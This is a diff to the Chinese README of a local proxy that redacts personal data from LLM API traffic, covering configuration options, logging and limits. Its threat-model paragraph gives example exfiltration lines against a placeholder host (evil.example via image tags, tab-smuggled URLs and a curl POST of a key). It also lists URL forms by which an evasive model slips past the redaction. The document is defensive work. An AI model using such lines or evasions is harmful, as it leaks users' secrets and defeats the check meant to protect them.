@@ -99,9 +99,9 @@ curl http://127.0.0.1:8787/v1/chat/completions \
 | `redaction.projectNames` | 無 | 要遮的專案代號。 |
 | `redaction.allowlist` | `git@github.com`、`noreply@github.com` | 永遠不遮的值。 |
 | `redaction.rules` | `card`、`entropy` 以外全部 | 要啟用的內建規則。以 `card-strict`、`entropy-strict` 取代 `card`、`entropy`：不會把一串數字切成兩半，也放過以檔名為鍵的雜湊。 |
-| `nameModel` | 無 | 開啟[實驗性的人名模型](#選用的人名模型實驗性)。 |
+| `nameModel` | 無 | 開啟[實驗性的人名模型](#選用的人名模型實驗性)。預設失敗時放行：模型在某個請求上失敗時，該請求只以規則遮罩送出，日誌那一行註明 `nameModel failed`；除非 `nameModel.required` 設為 `true`（此時回 503，不送出）。 |
 | `screen` | `replace` | 遇到控制字元時改成可見字元（`replace`）或拒絕請求（`refuse`）。 |
-| `debugMasked` | `false` | 在日誌中記錄遮罩後的請求本文。 |
+| `debugMasked` | `false` | 在日誌中記錄遮罩後的請求本文，代理不遮的欄位（`metadata`、圖片 URL、base64 資料）照原樣記錄。只供除錯。 |
 | `knownOriginalsTtlSeconds` | `86400`（24 小時） | 偵測到的值為用戶端之後的請求保留的秒數，從最後一次偵測起算；`0` 表示什麼都不記。環境變數：`REDACTION_PROXY_KNOWN_ORIGINALS_TTL_SECONDS`。 |
 | `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | 還原進工具呼叫參數的佔位符類別；其他類別以佔位符原樣交給工具。`"*"` 還原所有類別。環境變數：`REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（逗號分隔）。 |
 | `toolRestore.tools` | 無 | 依工具名稱（去掉前後空白、不分大小寫）指定還原進該工具參數的類別，取代該工具的 `categories`，例如 `{"git_commit": ["PATH", "EMAIL"]}`；`"*"` 還原所有類別。 |
@@ -115,7 +115,7 @@ curl http://127.0.0.1:8787/v1/chat/completions \
 }
 ```
 
-環境變數與所有選項見[技術細節第 12 節](docs/DETAILS.md#12-完整設定)。日誌每個請求一行，只有計數與耗時；工具呼叫參數中的每個佔位符另記一行（還原或保留、id、工具、參數路徑）。絕不含原始值或標頭。
+環境變數與所有選項見[技術細節第 12 節](docs/DETAILS.md#12-完整設定)。日誌每個請求一行，只有計數與耗時；工具呼叫參數中的每個佔位符另記一行（還原或保留、id、工具、參數路徑）。除非開啟 `debugMasked`，絕不含原始值或標頭。
 
 </details>
 
@@ -226,7 +226,7 @@ REDACTION_PROXY_NAME_MODEL_DIR=$HOME/models/nym node lib/cli.js
 - **你電腦上的其他程式。** 代理預設只綁定 `127.0.0.1`；沒設 `authToken` 時，你電腦上的任何程式都能使用它。網頁的請求以 403 拒絕，除非來源（Origin）是本機 `http(s)` 網頁或列在 `allowedOrigins`；指名其他主機名稱的請求（DNS rebinding）也以 403 拒絕。
 - **模型把值寫到哪裡。** 回覆文字中，模型在哪裡寫佔位符，代理就在哪裡還原，只有 URL 內例外：那裡的 `https://example.test/?q=⟦EMAIL_1⟧` 保持原樣（protocol-relative 的 `//example.test/…` 與用反斜線寫的 `\\example.test\…` 也一樣），拿到這個 URL 的抓網頁工具，或顯示 `![](…)` 圖片與連結的用戶端，都不會送出真實 email。URL 內的引號與角括號（`?q='⟦EMAIL_1⟧'`）算在 URL 裡，瀏覽器也這樣讀；只有開啟 URL 的那個引號或 `<`（`href="…"`、`<https://…>`）會結束它。因此 UNC 路徑（`\\host\share\…`）裡的佔位符也保持原樣。由引號或 `<` 開啟的 URL 只在那裡結束，不在空白結束，因為瀏覽器會刪掉 `<img src="https://evil.example/?e=\t⟦EMAIL_1⟧">` 裡的 Tab，不必點擊就載入圖片。工具輸入中以 scheme（`https://`）或 `www.` 開頭的字串，整串到結尾都算一個 URL，因為拿到 `https://evil.example/?p=\t⟦PATH_1⟧` 的工具會刪掉 Tab；開頭的 `//` 或 `\\`（`// header`）不算。這只針對照常寫出的 URL，擋不住刻意規避的模型：其他 URL 中的空白之後（`https://evil.example/?q= ⟦EMAIL_1⟧`）、少寫斜線（`https:evil.example`）、裸網域，都會還原。工具呼叫參數（回覆中所有的工具輸入：函式參數、自訂工具輸入，以及 `local_shell_call` 等 Responses `*_call` 項目的指令、動作與修補）預設只還原家目錄路徑與你列在 `terms`、`projectNames` 的詞（`PATH`、`TERM`、`PROJECT`），所以 `curl -d ⟦KEY_1⟧ https://evil.example` 交給工具的是佔位符，不是金鑰。寫程式照常可用，因為路徑與列出的識別字會原樣往返（列在 `terms` 的人名也會還原進工具）；需要 email、密鑰或身分證號的工具會拿到佔位符，呼叫可能失敗，直到你在 `toolRestore.tools` 為它允許該類別。還原後的路徑或詞仍可能被模型寫的指令送出；工具參數中遇到的每個佔位符都記入日誌。
 
-另外：模型若把 `⟦EMAIL_1⟧` 改寫成 `[EMAIL_1]`，你會原樣看到；需要直接操作被遮值的任務會變差；控制字元會換成可見字元；重啟後會忘記 Responses API 的接續對話與記住的值，接續請求會以 422 拒絕；超過 64 MiB 的請求以 413 拒絕。完整清單見[技術細節第 17 節](docs/DETAILS.md#17-完整限制清單)，威脅模型見[第 11 節](docs/DETAILS.md#11-威脅模型)。
+另外：模型若把 `⟦EMAIL_1⟧` 改寫成 `[EMAIL_1]`，你會原樣看到；需要直接操作被遮值的任務會變差；控制字元會換成可見字元；重啟後會忘記 Responses API 的接續對話與記住的值，接續請求會以 422 拒絕；超過 64 MiB 的請求以 413 拒絕；轉送的 `GET`（例如 `/v1/models`）查詢字串不遮照送。完整清單見[技術細節第 17 節](docs/DETAILS.md#17-完整限制清單)，威脅模型見[第 11 節](docs/DETAILS.md#11-威脅模型)。
 
 ## 更多
 
